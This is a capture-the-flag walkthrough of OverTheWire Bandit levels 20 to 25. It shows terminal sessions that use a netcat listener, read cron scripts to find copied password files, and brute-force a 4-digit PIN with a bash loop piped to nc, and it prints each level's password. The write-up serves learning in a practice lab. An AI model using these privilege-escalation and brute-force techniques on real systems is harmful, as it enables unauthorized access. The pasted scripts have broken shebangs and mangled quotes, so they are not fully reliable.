LEVEL(20-21)

```

ssh bandit20@bandit.labs.overthewire.org -p 2220

bandit20@bandit:~$ ls

suconnect
bandit20@bandit:~$ nc -lvp 1234

Listening on 0.0.0.0 1234

Connection received on localhost 34940

0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO(paste the password of bandit20)

then open the previous terminal and use

bandit20@bandit:~$ ./suconnect 1234

after the password get match ,sending the next password:- EeoULMCra2q0dSkYj561DX7s1CpBuOBt

```
LEVEL(21-22)

```

ssh bandit21@bandit.labs.overthewire.org -p 2220

bandit21@bandit:~$ ls /etc/cron.d/
cronjob_bandit22 cronjob_bandit24 otw-tmp-dir
cronjob_bandit23 e2scrub_all sysstat
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

* * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
bandit21@bandit:~$ exit

```

LEVEL(22-23)

```

ssh bandit22@bandit.labs.overthewire.org -p 2220

bandit22@bandit:~$ ls /etc/cron.d/
cronjob_bandit22 cronjob_bandit24 otw-tmp-dir
cronjob_bandit23 e2scrub_all sysstat
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null

* * * * bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ‘ ‘ -f 1)

echo “Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget”

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ echo “I am user bandit23” | md5sum | cut -d ‘ ‘ -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~ $ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
bandit22@bandit:~ $ exit

```

LEVEL(23-24)

```

ssh bandit23@bandit.labs.overthewire.org -p 2220

bandit23@bandit:~$ $ ls /etc/cron.d/
$: command not found
bandit23@bandit:~$ ls /etc/cron.d/
cronjob_bandit22 cronjob_bandit24 otw-tmp-dir
cronjob_bandit23 e2scrub_all sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

* * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
!/bin/bash
myname=$(whoami)

cd /var/spool/$myname/foo
echo “Executing and deleting all scripts in /var/spool/$myname/foo:”
for i in * .*;
do
if [ “$i” != “.” -a “$i” != “..” ];
then
echo “Handling $i”
owner=”$(stat –format “%U” ./$i)”
if [ “${owner}” = “bandit23” ]; then
timeout -s 9 60 ./$i
fi
rm -f ./$i
fi
done

bandit23@bandit:~$ vi /tmp/cronjob.sh
[New] 2L, 3B written
bandit23@bandit:~$ cp /tmp/cronjob.sh /var/spool/bandit24
cp: cannot create regular file ‘/var/spool/bandit24/cronjob.sh’: Operation not permitted
bandit23@bandit:~$ cat /tmp/password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

```

LEVEL(24-25)

```

ssh bandit24@bandit.labs.overthewire.org -p 2220

$ vi /tmp/brute-forcing.sh

!/bin/bash
password=$(cat /etc/bandit_pass/bandit24)

for i in $(seq -w 9999);
do
echo “$password $i” | nc localhost 30002
done

2. chmod [MODE] [FILE]

$ chmod u+x /tmp/brute-forcing.sh

3.

$ /tmp/brute-forcing.sh
–More–
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

```